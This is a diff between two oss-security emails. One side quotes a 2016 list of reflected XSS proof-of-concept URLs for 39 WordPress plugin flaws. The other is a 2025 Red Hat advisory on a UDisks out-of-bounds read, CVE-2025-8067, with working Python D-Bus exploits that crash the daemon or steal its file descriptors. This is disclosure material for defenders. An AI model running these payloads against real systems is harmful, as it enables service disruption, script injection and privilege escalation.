@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["11753" "Wednesday" "13" "April" "2016" "08:34:05" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<A8289BA8-C282-48E1-8C37-CF1ED92BC5E9@me.com>" "188" "Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." "^Date:" nil nil "4" "2016041312:34:05" "[oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." (number mark "        larry0@me.co Apr 13  188/11753 " thread-indent "\"Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.\"\n") "<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>" ("<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 19503 invoked by uid 550); 13 Apr 2016 12:34:22 -0000
+Received: (qmail 24476 invoked by uid 550); 28 Aug 2025 15:21:31 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,220 +6,248 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 19485 invoked from network); 13 Apr 2016 12:34:21 -0000
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2016-04-13_08:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1015 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1510270003 definitions=main-1604130182
-Content-type: text/plain; charset=us-ascii
-MIME-version: 1.0 (Mac OS X Mail 9.2 \(3112\))
-In-reply-to: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
-Content-transfer-encoding: quoted-printable
-Message-id: <A8289BA8-C282-48E1-8C37-CF1ED92BC5E9@me.com>
-References: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
-X-Mailer: Apple Mail (2.3112)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
-	t=1460550845; bh=7g/Evtqo/lixbb+aR7S96F1QIEsKyJhW7AkdLzlPV9Q=;
-	h=Content-type:MIME-version:Subject:From:Date:Message-id:To;
-	b=CnQptglCpo018o8vN38KSGD0IKVoatQjXjkJm57fOy8re7jejDREZZZOt2HupNaiX
- DyuaCqFq/MCB46RsSEfWj0byqzpBWRXEhLu9koQOy5zNpqzSPWKFhAOxEKfA7/l222
- wVERote7WrzS2/zRJqC8oMmuMYds4Hcxu4Puv6E1DehprrAtQOZRwbwxNmpzCdY8Sb
- z2qEgDLPylG7om1+Fg58TJHJLKL/ONWyEuCMBRnEpATS1oA3fEBbsNBq7aEHpjkk/c
- 3WW+KyhcOfcifZ2pY7MMZlEQfW3wqPNe165A4VtcIRZI8GajWEp63cE3NwKBPGOi2J
- 3APJ92jVQse6w==
-Date: Wed, 13 Apr 2016 08:34:05 -0400
-From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.
+x-ms-reactions: disallow
+Received: (qmail 15727 invoked from network); 28 Aug 2025 14:40:32 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+	s=mimecast20190719; t=1756392022;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:content-type:content-type;
+	bh=89Typ5JjIolAa+eu/d0zSFA+P3pDe6NZKMg1ULqz+NY=;
+	b=Bi3w2SoMY34zhRikEPZhUHUqn+mEKp01XpMlQVQu23Sl6CXwIMxdBdNS4MKit6/DZEBiWX
+	rBwnux8X/xrBeDw7BuecxB5w7xtmO1OX/uWCykNffpNgiHd9l6ziFJyZfuOcPgpV8O7qXg
+	N0qS4h81TSYeoA5K6hAUhhNjgRrBOJQ=
+X-MC-Unique: NwFvYCt7NE2kRBl8hvW3Yw-1
+X-Mimecast-MFC-AGG-ID: NwFvYCt7NE2kRBl8hvW3Yw_1756392019
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1756392019; x=1756996819;
+        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=89Typ5JjIolAa+eu/d0zSFA+P3pDe6NZKMg1ULqz+NY=;
+        b=dPRcCG9AUZo45GxEk9C2U9lU3oCHtgxUvVu8XxPanuhYUY88OzxMUOfKLe8KIyFonj
+         iKT7+z/wLqEeavS3hpBdHzze6TKSJz4klM1e7TCXzlMHQW/aF7H2MbHmo39vGf42BGGu
+         kqxCPctNa0gAEUW5HgH2rg+oyaxJHatgWz3ceT6teYB70258hhN3At7nS7UQPr7+AnMV
+         C16Shimct0IPlBf2uVkBgK6ta1WCq2VGpJm1Z37RYYWXiKjCW9vrPtVVpW/WGSsuUID5
+         z/VpVdjonpsC6Q5pl24+J5TUodrJwmiat+AXo+/NdaGXwovdraLe2KXNcQZsG8V6qVdr
+         eiGA==
+X-Gm-Message-State: AOJu0Yw/3s4rVMrLMBH9xTwZ3dEhnpVi7/7XzjjUm7i4PoE1JvXUGtaE
+	r7a4U/8On7HA6795Hly6MbP+CUpyRMHWqX1vjqiTnkYtaefRaqqI5/eMJb6cw/mds+CqY7JSo4U
+	7w5MqWA69aWoJxQioyHrbZbhlpy7w8WKxV7pXcyXPObTAJtO5xFhHLTsWQYF+7u9ZwxNa6jp+kW
+	XP7N2UH6hwJ6YsK93JZQOvT5/0Pigd6ui97k6FMQGvlOTaSIUFiEkO2sU=
+X-Gm-Gg: ASbGnctFn4pAfeZRxf74kymfoegU1NEJfBW6GwNBK5QgsWNYc7NeL6n67xLqFn8Pdb4
+	rXB8/HzZ00blXmXmF+dTc60Ldg3fdwA5tNwkxnq7b7tdSG50evJkHm2mtpd0RNs0EhZ5QixWtAT
+	znT3BW5x5MQ2Juf6uQDaG6kQ==
+X-Received: by 2002:a17:902:e5c5:b0:248:ef1f:bbbe with SMTP id d9443c01a7336-248ef1fbf53mr18383935ad.0.1756392018938;
+        Thu, 28 Aug 2025 07:40:18 -0700 (PDT)
+X-Google-Smtp-Source: AGHT+IG7DhDGYp6x30LLHoeKMDJPcZf+9TRZDoxtE50hip0XCVs0dtiz4wxVaYOInlOdLB7A6U8QuOQhVBGf1/bTsMY=
+X-Received: by 2002:a17:902:e5c5:b0:248:ef1f:bbbe with SMTP id
+ d9443c01a7336-248ef1fbf53mr18383465ad.0.1756392018388; Thu, 28 Aug 2025
+ 07:40:18 -0700 (PDT)
+MIME-Version: 1.0
+From: Marco Benatto <mbenatto@redhat.com>
+Date: Thu, 28 Aug 2025 11:39:42 -0300
+X-Gm-Features: Ac12FXz-sGdIPgttJYGziG720jkKivn3K62VVRBGW7qFl6DkELp442XdE_eX7OU
+Message-ID: <CAOGQQ28=RumQ21g-PFw=hNX3qpkyViYzCjPPqZLVJu8SWry05A@mail.gmail.com>
 To: oss-security@lists.openwall.com
+Cc: Tomas Bzatek <tbzatek@redhat.com>, Marc Deslauriers <marc.deslauriers@canonical.com>
+X-Mimecast-Spam-Score: 0
+X-Mimecast-MFC-PROC-ID: 76TFx8ww8F3YsR1fLSgvLHO0wcZh3gZX5z83nRXA6XQ_1756392019
+X-Mimecast-Originator: redhat.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] CVE-2025-8067 - UDisks
 
-Hello List,
+Hello,
 
-This was meant to be s/CVE/DWF/g thanks Henri for catching that.
+the Red Hat Product Security team has received a report for a
+vulnerability in the UDisks daemon.
+Coordinating with the report and the upstream developers we have
+assigned CVE-2025-8067 with the CVSSv3.1 score of:
 
--- Larry
+CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H - 8.5
+
+This issue is fixed in udisks2 versions 2.10.91 and 2.10.2
+The upstream advisory is available at:
+
+https://github.com/storaged-project/udisks/security/advisories/GHSA-742q-gggc-473g
+
+Please find out the full report sent on behalf of the reporter:
+
+===== FULL REPORT =====
+
+==============================
+  SUMMARY
+==============================
+
+Title: Out-Of-Bounds Read in UDisks Daemon
+CVSS: 8.5 High CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H
+Version: Ubuntu 24.04.2 LTS, udisks2 2.10.1-6ubuntu1.2
+
+The UDisks daemon contains an out-of-bounds (OOB) read vulnerability
+that can be triggered by an unprivileged user via system bus. Successful
+exploitation leads to a crash of the daemon process, or mapping of an
+internal file descriptor from the daemon process onto a loop device,
+likely resulting in local privilege escalation.
+
+==============================
+  DETAILS
+==============================
+
+The UDisks daemon enables unprivileged users to create loop devices
+through the D-BUS system bus. Its handler accepts multiple arguments,
+including fd_list and fd_index, which are used to specify the backing
+file for the loop device.
+
+Although there is a check in place [0] to ensure that fd_index does not
+exceed the bounds of the fd_list array, there is no validation for the
+lower bound. As a result, passing a negative value for fd_index leads to
+an out-of-bounds (OOB) read vulnerability [1].
+
+udisks - src/udiskslinuxmanager.c
+----------------------------------------
+static gboolean
+handle_loop_setup (UDisksManager          *object,
+                    GDBusMethodInvocation  *invocation,
+                    GUnixFDList            *fd_list,
+                    GVariant               *fd_index,
+                    GVariant               *options)
+{
+     (...)
+     fd_num = g_variant_get_handle (fd_index);
+     // [0] upper bound check
+     if (fd_list == NULL || fd_num >= g_unix_fd_list_get_length
+(fd_list))
+         {
+             (...)
+             goto out;
+     (...)
+     fd = g_unix_fd_list_get (fd_list, fd_num, &error);
+     (...)
+     if (!bd_loop_setup_from_fd (fd,
+                                 option_offset,
+                                 option_size,
+                                 option_read_only,
 
 
-> On Apr 12, 2016, at 8:48 AM, Larry W. Cashdollar <larry0@me.com> wrote:
->=20
-> Hello List,
->=20
->=20
-> This was a project I worked on as part of my research in Akamai's SIRT, I=
- initially found 1352 suspect XSS vulnerabilities but Wordpress escapes sup=
-er globals GET/POST/REQUEST
-> https://core.trac.wordpress.org/ticket/18322.  I didn't know this at the =
-time, so now I have a database of vulnerabilities that are context dependen=
-t and would need to be examined
-> individually.  I managed to automate XSS testing against the database and=
- of 1352 39 successfully executed javascript.  These are those 39, I've man=
-ually verified they're still vulnerable.
->=20
-> They're available here http://www.vapidlabs.com/wp/wp.php
->=20
-> I notified Wordpress back in February of my research.
->=20
->=20
-> Plugin:https://wordpress.org/plugins/mousewheel-smooth-scroll File:./mous=
-ewheel-smooth-scroll/js/wpmss.php Parameter:ease  speed step CVE-2016-77447=
- PoC:hxxp://[target]/wp-content/plugins/mousewheel-smooth-scroll/js/wpmss.p=
-hp?step=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/indexisto File:./indexisto/assets/js=
-/indexisto-inject.php Parameter:indexisto_index CVE-2016-77360 PoC:hxxp://[=
-target]/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexis=
-to_index=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/prettypre File:./prettypre/prettypre=
-css.php Parameter:ts CVE-2016-77548 PoC:hxxp://[target]/wp-content/plugins/=
-prettypre/prettyprecss.php?ts=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/whizz File:./whizz/plugins/delete-pl=
-ugin.php Parameter:plugin CVE-2016-77799 PoC:hxxp://[target]/wp-content/plu=
-gins/whizz/plugins/delete-plugin.php?plugin=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/mypuzzle-jigsaw File:./mypuzzle-jigs=
-aw/getGallery.php Parameter:callback CVE-2016-77465 PoC:hxxp://[target]/wp-=
-content/plugins/mypuzzle-jigsaw/getGallery.php?callback=3D"><script>alert(1=
-);</script><"
-> Plugin:https://wordpress.org/plugins/anti-plagiarism File:./anti-plagiari=
-sm/js.php Parameter:m CVE-2016-77035 PoC:hxxp://[target]/wp-content/plugins=
-/anti-plagiarism/js.php?m=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/qoate-scroll-triggered-box File:./qo=
-ate-scroll-triggered-box/assets/js/script.php Parameter:anim perc sac vpos =
-CVE-2016-77559 PoC:hxxp://[target]/wp-content/plugins/qoate-scroll-triggere=
-d-box/assets/js/script.php?anim=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/s3-video File:./s3-video/views/video=
--management/preview_video.php Parameter:media CVE-2016-77600 PoC:hxxp://[ta=
-rget]/wp-content/plugins/s3-video/views/video-management/preview_video.php?=
-media=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/wpsolr-search-engine File:./wpsolr-s=
-earch-engine/classes/extensions/managed-solr-servers/templates/template-my-=
-accounts.php Parameter:page  tab CVE-2016-77958 PoC:hxxp://[target]/wp-cont=
-ent/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/te=
-mplates/template-my-accounts.php?page=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/page-layout-builder File:./page-layo=
-ut-builder/includes/layout-settings.php Parameter:layout_settings_id CVE-20=
-16-77503 PoC:hxxp://[target]/wp-content/plugins/page-layout-builder/include=
-s/layout-settings.php?layout_settings_id=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/mypuzzle-sliding File:./mypuzzle-sli=
-ding/getGallery.php Parameter:callback CVE-2016-77466 PoC:hxxp://[target]/w=
-p-content/plugins/mypuzzle-sliding/getGallery.php?callback=3D"><script>aler=
-t(1);</script><"
-> Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/date_s=
-elect.php Parameter:date-from date-to CVE-2016-77217 PoC:hxxp://[target]/wp=
--content/plugins/e-search/tmpl/date_select.php?date-from=3D"><script>alert(=
-1);</script><"
-> Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/title_=
-az.php Parameter:title_az CVE-2016-77217 PoC:hxxp://[target]/wp-content/plu=
-gins/e-search/tmpl/title_az.php?title_az=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/tidio-gallery File:./tidio-gallery/p=
-opup-insert-help.php Parameter:galleryId id  tidio-gallery CVE-2016-77727 P=
-oC:hxxp://[target]/wp-content/plugins/tidio-gallery/popup-insert-help.php?g=
-alleryId=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/parsi-font File:./parsi-font/css.php=
- Parameter:font size CVE-2016-77506 PoC:hxxp://[target]/wp-content/plugins/=
-parsi-font/css.php?size=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/defa-online-image-protector File:./d=
-efa-online-image-protector/redirect.php Parameter:r CVE-2016-77193 PoC:hxxp=
-://[target]/wp-content/plugins/defa-online-image-protector/redirect.php?r=
-=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/new-year-firework File:./new-year-fi=
-rework/firework/index.php Parameter:music text url CVE-2016-77475 PoC:hxxp:=
-//[target]/wp-content/plugins/new-year-firework/firework/index.php?text=3D"=
-><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/simpel-reserveren File:./simpel-rese=
-rveren/edit.php Parameter:page CVE-2016-77628 PoC:hxxp://[target]/wp-conten=
-t/plugins/simpel-reserveren/edit.php?page=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/groupon-widget File:./groupon-widget=
-/widget.css.php Parameter:grpn_wdgt_get_it_btn_background grpn_wdgt_link_co=
-lor grpn_wdgt_price_tag_background grpn_wdgt_shell_background grpn_wdgt_tex=
-t_color grpn_wdgt_title_color CVE-2016-77332 PoC:hxxp://[target]/wp-content=
-/plugins/groupon-widget/widget.css.php?grpn_wdgt_shell_background=3D"><scri=
-pt>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/wp-notifications File:./wp-notificat=
-ions/css/ln_livenotifications_css.php Parameter:banner_bgcolor dropdown_bit=
-_bgcolor dropdown_bit_color dropdown_boder_color dropdown_color dropdown_ho=
-ver_bgcolor dropdown_link_color CVE-2016-77885 PoC:hxxp://[target]/wp-conte=
-nt/plugins/wp-notifications/css/ln_livenotifications_css.php?dropdown_color=
-=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/wp-latest-posts File:./wp-latest-pos=
-ts/js/wpcufpn_front.js.php Parameter:id CVE-2016-77873 PoC:hxxp://[target]/=
-wp-content/plugins/wp-latest-posts/js/wpcufpn_front.js.php?id=3D"><script>a=
-lert(1);</script><"
-> Plugin:https://wordpress.org/plugins/ajax-random-post File:./ajax-random-=
-post/js.php Parameter:count interval CVE-2016-77022 PoC:hxxp://[target]/wp-=
-content/plugins/ajax-random-post/js.php?interval=3D"><script>alert(1);</scr=
-ipt><"
-> Plugin:https://wordpress.org/plugins/admin-font-editor File:./admin-font-=
-editor/css.php Parameter:font size CVE-2016-77009 PoC:hxxp://[target]/wp-co=
-ntent/plugins/admin-font-editor/css.php?size=3D"><script>alert(1);</script>=
-<"
-> Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/playlist.ph=
-p Parameter:playlist CVE-2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
-hdw-tube/playlist.php?playlist=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/mychannel.p=
-hp Parameter:channel CVE-2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
-hdw-tube/mychannel.php?channel=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/lbak-google-checkout File:./lbak-goo=
-gle-checkout/css/googlecheckout.php Parameter:ih iw ph pw tc CVE-2016-77395=
- PoC:hxxp://[target]/wp-content/plugins/lbak-google-checkout/css/googlechec=
-kout.php?pw=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/razuna-media-manager File:./razuna-m=
-edia-manager/pages/ajax/razuna-upload-callback.php Parameter:message respon=
-secode CVE-2016-77577 PoC:hxxp://[target]/wp-content/plugins/razuna-media-m=
-anager/pages/ajax/razuna-upload-callback.php?responsecode=3D"><script>alert=
-(1);</script><"
-> Plugin:https://wordpress.org/plugins/mypuzzle-find-the-pair-a-memory-game=
- File:./mypuzzle-find-the-pair-a-memory-game/ftpair-getCardImages.php Param=
-eter:callback CVE-2016-77464 PoC:hxxp://[target]/wp-content/plugins/mypuzzl=
-e-find-the-pair-a-memory-game/ftpair-getCardImages.php?callback=3D"><script=
->alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/surveymonkey-button File:./surveymon=
-key-button/start_survey.php Parameter:jqueryPepPath CVE-2016-77702 PoC:hxxp=
-://[target]/wp-content/plugins/surveymonkey-button/start_survey.php?jqueryP=
-epPath=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/hero-maps-pro File:./hero-maps-pro/v=
-iews/dashboard/index.php Parameter:p v CVE-2016-77341 PoC:hxxp://[target]/w=
-p-content/plugins/hero-maps-pro/views/dashboard/index.php?v=3D"><script>ale=
-rt(1);</script><"
-> Plugin:https://wordpress.org/plugins/bbpress-social-network File:./bbpres=
-s-social-network/css/ln_livenotifications_css.php Parameter:banner_bgcolor =
-dropdown_bit_bgcolor dropdown_bit_color dropdown_boder_color dropdown_color=
- dropdown_hover_bgcolor dropdown_link_color CVE-2016-77074 PoC:hxxp://[targ=
-et]/wp-content/plugins/bbpress-social-network/css/ln_livenotifications_css.=
-php?dropdown_color=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/bbpress-social-network File:./bbpres=
-s-social-network/css/ln_livenotifications_cssback.php Parameter:banner_bgco=
-lor dropdown_bgcolor dropdown_bit_bgcolor dropdown_bit_color dropdown_boder=
-_color dropdown_color dropdown_hover_bgcolor dropdown_link_color CVE-2016-7=
-7074 PoC:hxxp://[target]/wp-content/plugins/bbpress-social-network/css/ln_l=
-ivenotifications_cssback.php?dropdown_bgcolor=3D"><script>alert(1);</script=
-><"
-> Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/commo=
-n/inc/pages/edit_styles.php Parameter:gid CVE-2016-77517 PoC:hxxp://[target=
-]/wp-content/plugins/photoxhibit/common/inc/pages/edit_styles.php?gid=3D"><=
-script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/commo=
-n/inc/pages/build.php Parameter:gid CVE-2016-77517 PoC:hxxp://[target]/wp-c=
-ontent/plugins/photoxhibit/common/inc/pages/build.php?gid=3D"><script>alert=
-(1);</script><"
-> Plugin:https://wordpress.org/plugins/pondol-formmail File:./pondol-formma=
-il/pages/admin-mail-info.php Parameter:itemid CVE-2016-77532 PoC:hxxp://[ta=
-rget]/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=
-=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/heat-trackr File:./heat-trackr/heat-=
-trackr_abtest_add.php Parameter:id N  WPSLT CVE-2016-77339 PoC:hxxp://[targ=
-et]/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id=3D"><scrip=
-t>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/tidio-form File:./tidio-form/popup-i=
-nsert-help.php Parameter:formId id  tidio-form CVE-2016-77726 PoC:hxxp://[t=
-arget]/wp-content/plugins/tidio-form/popup-insert-help.php?formId=3D"><scri=
-pt>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/simplified-content File:./simplified=
--content/ooawpframework/js/ajax/OOAAjax.js.php Parameter:ajaxURL CVE-2016-7=
-7642 PoC:hxxp://[target]/wp-content/plugins/simplified-content/ooawpframewo=
-rk/js/ajax/OOAAjax.js.php?ajaxURL=3D"><script>alert(1);</script><"
-> Plugin:https://wordpress.org/plugins/infusionsoft File:./infusionsoft/Inf=
-usionsoft/examples/leadscoring.php Parameter:ContactId CVE-2016-77364 PoC:h=
-xxp://[target]/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadsc=
-oring.php?ContactId=3D"><script>alert(1);</script><"
+GLib - gio/gunixfdlist.c
+----------------------------------------
+gint
+g_unix_fd_list_get (GUnixFDList  *list,
+                     gint          index_,
+                     GError      **error)
+{
+   (...)
+
+   // [1] OOB read
+   return dup_close_on_exec_fd (list->priv->fds[index_], error);
+}
+
+Successful exploitation of this vulnerability can have two consequences.
+First, it can cause the daemon process to crash, resulting in a denial
+of service. Second, an attacker can use this to map an internal file
+descriptor from the daemon process onto a loop device. This occurs
+because the value returned by the OOB read is interpreted as a file
+descriptor; if it corresponds to a valid open descriptor in the daemon
+process, it can be successfully mapped to a loop device. This can open
+up attack paths leading to local privilege escalation.
+
+For example: An attacker could potentially coerce the daemon process
+into opening an arbitrary file, creating a file descriptor that could
+then be inadvertently exposed and reused in this way.
+
+==============================
+   PROOF OF CONCEPT
+==============================
+
+POC: Crash
+----------------------------------------
+from gi.repository import Gio, GLib
+
+oob_idx = -2**30
+
+bus = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
+proxy = Gio.DBusProxy.new_sync(
+     bus,
+     Gio.DBusProxyFlags.NONE,
+     None,
+     "org.freedesktop.UDisks2",
+     "/org/freedesktop/UDisks2/Manager",
+     "org.freedesktop.UDisks2.Manager",
+     None
+)
+
+proxy.call_with_unix_fd_list_sync(
+     "LoopSetup",
+     GLib.Variant("(ha{sv})", (oob_idx, {})),
+     Gio.DBusCallFlags.NONE,
+     -1,
+     Gio.UnixFDList.new_from_array([1]),
+     None,
+)
+
+POC: "Stealing" file descriptor of daemon process
+----------------------------------------
+from gi.repository import Gio, GLib
+
+def setup_loop(bus, idx):
+     proxy = Gio.DBusProxy.new_sync(
+         bus,
+         Gio.DBusProxyFlags.NONE,
+         None,
+         "org.freedesktop.UDisks2",
+         "/org/freedesktop/UDisks2/Manager",
+         "org.freedesktop.UDisks2.Manager",
+         None
+     )
+
+     fdlist = Gio.UnixFDList()
+     fdlist.append(1)
+
+     result = proxy.call_with_unix_fd_list_sync(
+         "LoopSetup",
+         GLib.Variant("(ha{sv})", (idx, {})),
+         Gio.DBusCallFlags.NONE,
+         -1,
+         fdlist,
+         None,
+     )
+
+     return result[0].unpack()[0]
+
+
+def get_backing_file(bus, dev):
+     proxy = Gio.DBusProxy.new_sync(
+         bus,
+         Gio.DBusProxyFlags.NONE,
+         None,
+         "org.freedesktop.UDisks2",
+         dev,
+         "org.freedesktop.UDisks2.Loop",
+         None
+     )
+     return bytes(proxy.get_cached_property("BackingFile")).decode()
+
+
+if __name__ == "__main__":
+     bus = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
+
+     print("[+] Trying loop setup with oob indices")
+     for i in range(-1, -1000, -1):
+         try:
+             dev = setup_loop(bus, i)
+             print("[+] Hit valid fd at index", i)
+             print("[+] Setup loop device", dev)
+             break
+         except Exception:
+             pass
+
+     backing_file = get_backing_file(bus, dev)
+     print("[+] Stole fd for", backing_file)
+
+Please let me know if you need any additional details.
+
+I would be happy to be credited as "Michael Imfeld (born0monday)".
+
+Marco Benatto
+Red Hat Product Security
+secalert@redhat.com for urgent response
 
